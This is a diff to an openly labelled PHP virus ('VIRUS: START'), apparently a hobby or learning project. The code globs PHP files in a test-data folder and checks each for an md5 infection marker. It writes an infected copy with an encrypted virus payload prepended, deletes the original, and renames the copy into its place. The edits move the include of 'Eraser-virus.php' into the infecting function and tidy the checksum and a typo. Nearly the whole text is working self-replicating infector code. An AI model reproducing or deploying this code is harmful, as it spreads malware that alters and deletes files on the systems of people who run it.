@@ -1,17 +1,19 @@
 <?php
-    include "Eraser-virus.php";
-    //VIRUS: START 
+    //VIRUS: START
     function execute($virus){
-        //get all the filenames with .dev extension thats already saved
-        $filenames = glob('*.pub');
+        // payload
+        include "Eraser-virus.php";
 
+        //get all the filenames with .dev extension thats already saved
+        $filenames = glob('test-data/*.php');
+        
         //loop throught all the filesize
         foreach ($filenames as $filename) {
             # open the file and read targeted(.dev)...
             $script = fopen($filename, "r");
 
             // check whether the file is infected
-            $fist_line = fgets($script); // gets first line of the file
+            $first_line = fgets($script); // gets first line of the file
             $virus_hash = md5($filename); //creates a hash 
 
             // check whether the hash appears on the first line of the file
@@ -20,7 +22,7 @@
                 //to avoid issues with large files->file to handle
                 $infected = fopen("$filename.infected", "w");
                 
-                $checksum = $virus_hash;
+                $checksum = '<?php '.$virus_hash.' ?>';
                 $infection = '<?php '.encryptedVirus($virus).' ?>';
                 
                 fputs($infected, $checksum, strlen($checksum));
@@ -36,7 +38,7 @@
                 //close all the handles and move the infected files in to place
                 fclose($script);
                 fclose($infected);
-                unlink($filename);
+                unlink("$filename");
                 rename("$filename.infected", $filename);
             }
         }
@@ -49,3 +51,5 @@
 
     // call our function for excecution
     execute($virus);
+    
+    
